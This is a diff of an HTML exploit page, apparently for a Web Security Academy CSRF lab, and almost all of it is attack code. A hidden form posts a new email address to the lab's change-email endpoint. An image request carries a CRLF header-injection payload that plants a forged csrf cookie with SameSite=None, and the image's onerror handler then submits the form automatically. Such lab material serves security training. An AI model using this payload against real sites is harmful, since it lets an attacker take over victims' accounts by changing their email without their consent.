@@ -55,16 +55,15 @@
     <body>
         <h1>you have been hacked </h1>
         <iframe style="display:none" name="csrf-iframe" ></iframe>
-        <form action="https://0aac00cf036bd6f28017d0950056006f.web-security-academy.net/my-account/change-email"
+        <form action="https://0ab0004004f5815a81aa072500b2004f.web-security-academy.net/my-account/change-email"
               method="post" id="csrf-form" target="csrf-iframe">
-            <input type="hidden" name="email" value="hack2@gmail.com">
-            <input type="hidden" name="csrf" value="OlXJaZp73mFbXEvTPbiYHTsKRkc6ChZJ" >
+            <input type="hidden" name="email" value="hack23@gmail.com">
+            <input type="hidden" name="csrf" value="uxjeqT7lVdPQkDrGtAttjARBfGSNkHOM" >
 
         </form>
-        <!-- <script>document.getElementById('csrf-form').submit()</script> -->
         <img 
         style="display:none" 
-        src="https://0aac00cf036bd6f28017d0950056006f.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=OlXJaZp73mFbXEvTPbiYHTsKRkc6ChZJ%3b%20SameSite=None"
+        src="https://0ab0004004f5815a81aa072500b2004f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
             onerror="document.getElementById('csrf-form').submit()" />
     </body>
 </html>
